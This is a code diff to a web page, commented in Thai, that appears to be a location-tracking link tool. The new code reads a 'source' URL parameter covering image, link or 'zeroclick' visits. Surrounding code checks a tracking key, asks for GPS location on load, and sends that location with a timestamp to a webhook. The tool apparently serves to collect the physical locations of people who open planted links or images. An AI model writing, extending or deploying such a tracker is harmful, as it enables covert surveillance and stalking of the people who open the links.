@@ -103,12 +103,24 @@
       }
     }
 
+    // ฟังก์ชันตรวจสอบ source ของการเข้าชม
+    function getSourceType() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const source = urlParams.get('source') || "unknown";
+        return source.toLowerCase(); // คืนค่า source ในรูปแบบตัวพิมพ์เล็ก
+      } catch (error) {
+        console.error("Error checking source parameter:", error);
+        return "unknown";
+      }
+    }
+
     // ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook (ย้ายมาไว้ที่นี่เพื่อให้เรียกใช้ได้)
     function sendDataToWebhook(trackingKey, location, source) {
       // สร้างออบเจ็กต์ข้อมูล
       const data = {
         trackingKey: trackingKey,
-        source: source, // ระบุว่ามาจากรูปภาพหรือลิงก์
+        source: source, // ระบุว่ามาจากรูปภาพ, ลิงก์ หรือ zeroclick
         location: location, // ข้อมูลตำแหน่ง GPS
         timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
         // ข้อมูลอื่นๆ จะถูกเพิ่มใน script.js
@@ -122,6 +134,10 @@
     // ตรวจสอบ tracking key ก่อนที่จะโหลด script.js
     if (hasValidTrackingKey()) {
       console.log("Tracking key is valid. Loading main script...");
+      
+      // เช็คประเภทของ source
+      const sourceType = getSourceType();
+      console.log("Source type:", sourceType);
       
       // ขอสิทธิ์เข้าถึงตำแหน่ง GPS ทันที
       if (navigator.geolocation) {
